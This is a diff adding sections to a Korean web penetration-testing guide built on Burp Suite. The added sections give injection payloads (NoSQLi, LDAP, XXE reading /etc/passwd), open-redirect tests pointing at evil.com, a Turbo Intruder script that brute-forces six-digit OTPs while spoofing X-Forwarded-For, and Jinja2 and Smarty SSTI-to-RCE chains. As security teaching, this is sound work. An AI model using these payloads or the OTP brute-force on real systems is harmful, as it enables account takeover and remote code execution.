@@ -479,6 +479,153 @@ WebSocket 메시지 변조:
 □ 경로 순회: ../../../etc/passwd
 □ SQLi: ', ", 1=1--, SLEEP(5)
 □ SSTI: {{7*7}}, ${7*7}, <%= 7*7 %>
+□ NoSQLi: {"$gt": ""}, {"$where": "sleep(5000)"}
+□ LDAP Injection: *)(|(uid=*
+□ XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+□ Deserialization: Java/PHP 직렬화 데이터에 악성 객체 삽입
+□ Clickjacking: X-Frame-Options 헤더 미설정 확인
+□ CORS: Origin: evil.com → Access-Control-Allow-Origin 반응 확인
+```
+
+---
+
+## 11-2. Burp Suite로 Open Redirect 탐지
+
+### Open Redirect 개요 및 탐지
+```
+Open Redirect:
+  서버가 사용자 제공 URL로 리다이렉트 시
+  공격자가 피싱 사이트로 유도 가능
+
+취약한 패턴:
+  /redirect?url=https://attacker.com
+  /login?next=https://attacker.com
+  /logout?returnTo=//attacker.com  (프로토콜 상대 URL)
+  /go?link=javascript:alert(1)     (XSS 연계)
+```
+
+```bash
+# Open Redirect 탐지 페이로드
+https://target.com/redirect?url=https://evil.com
+https://target.com/redirect?url=//evil.com         (프로토콜 생략)
+https://target.com/redirect?url=https:evil.com
+https://target.com/redirect?url=\evil.com          (백슬래시)
+https://target.com/redirect?url=https://target.com@evil.com  (@ 오파싱)
+https://target.com/redirect?url=https://evil.com%2F%2Ftarget.com
+
+# Burp Intruder + 페이로드 목록으로 자동화
+# redirect 관련 파라미터: url, next, returnTo, go, link, redirect, redir, r, ret
+
+# gau + Open Redirect 파이프라인
+gau target.com | grep -E "redirect|next|url|returnTo|go=" | \
+  while read url; do
+    curl -I -L "$url" 2>/dev/null | grep "Location:" | grep -v "target.com"
+  done
+```
+
+### Rate Limiting 취약점 탐지
+```
+Rate Limiting 미적용 시 가능한 공격:
+  - 로그인 브루트포스
+  - OTP/인증 코드 브루트포스
+  - API 대량 요청 (크레딧 소진, 서비스 남용)
+
+탐지 방법:
+  Burp Suite Intruder → 동일 요청 100회 반복
+  → 응답 코드가 계속 200이면 Rate Limiting 없음
+  → 429 Too Many Requests: Rate Limiting 적용됨
+  → X-RateLimit-Limit, X-RateLimit-Remaining 헤더 확인
+
+우회 기법:
+  - X-Forwarded-For: 1.2.3.4 (매 요청마다 변경)
+  - X-Real-IP: 1.2.3.4
+  - X-Originating-IP: 1.2.3.4
+  → 서버가 이 헤더를 신뢰하면 IP Rate Limit 우회 가능
+```
+
+```python
+# Turbo Intruder로 Rate Limit 우회 테스트
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=10,
+                           requestsPerConnection=1)
+    
+    for i, otp in enumerate(range(100000, 999999)):
+        # X-Forwarded-For 매 요청마다 변경
+        req = target.req.replace('X-Forwarded-For: 1.1.1.1', 
+                                  f'X-Forwarded-For: 192.168.{i//255}.{i%255}')
+        engine.queue(req, str(otp).zfill(6))
+
+def handleResponse(req, interesting):
+    if 'invalid' not in req.response.lower():
+        table.add(req)
+```
+
+---
+
+## 12. SSTI (Server-Side Template Injection) 탐지
+
+### 템플릿 엔진별 탐지 페이로드
+```
+탐지 순서: 모든 사용자 입력 파라미터에 수학 표현식 삽입
+→ 서버가 계산 결과를 반환하면 SSTI 취약점 존재
+
+Jinja2 (Python/Flask):
+  {{7*7}}          → 49  (기본 탐지)
+  {{7*'7'}}        → 7777777  (Jinja2 특징적 결과)
+  {{config}}       → 앱 설정 노출
+  {{request.environ}}  → 환경변수
+  
+Twig (PHP):
+  {{7*7}}          → 49
+  {{7*'7'}}        → 49 (PHP 특징 — 문자열 자동 숫자 변환)
+
+FreeMarker (Java):
+  ${7*7}           → 49
+  <#assign>        → 변수 할당
+  
+Velocity (Java):
+  #set($x=7*7)${x} → 49
+  
+ERB (Ruby):
+  <%= 7*7 %>       → 49
+  
+Smarty (PHP):
+  {7*7}            → 49
+  {php}system('id'){/php}  → RCE (Smarty2)
+  
+Mako (Python):
+  ${7*7}           → 49
+  <%! import os %>
+```
+
+### SSTI → RCE 익스플로잇 (Jinja2)
+```python
+# Jinja2 RCE — Python 내장 함수 체인
+{{''.__class__.__mro__[1].__subclasses__()}}
+# → Python의 모든 클래스 목록 출력
+
+# subprocess.Popen 찾아서 실행
+{{''.__class__.__mro__[1].__subclasses__()[x]('id',shell=True,stdout=-1).communicate()}}
+
+# 간단한 RCE (필터링 없을 때)
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+# request 객체 악용
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+```
+
+### Burp Suite로 SSTI 탐지 자동화
+```
+1. Intruder → Sniper 모드
+2. 모든 파라미터에 § 마킹
+3. 페이로드: {{7*7}}, ${7*7}, #{7*7}, *{7*7}, <%= 7*7 %>
+4. Grep Match: "49" 응답 필터링
+5. 매칭된 파라미터 → Repeater에서 심화 분석
+
+Param Miner와 연계:
+- Param Miner가 발견한 숨겨진 파라미터에도 SSTI 시도
+- 특히 template, view, page, render 같은 이름의 파라미터 우선
 ```
 
 ---
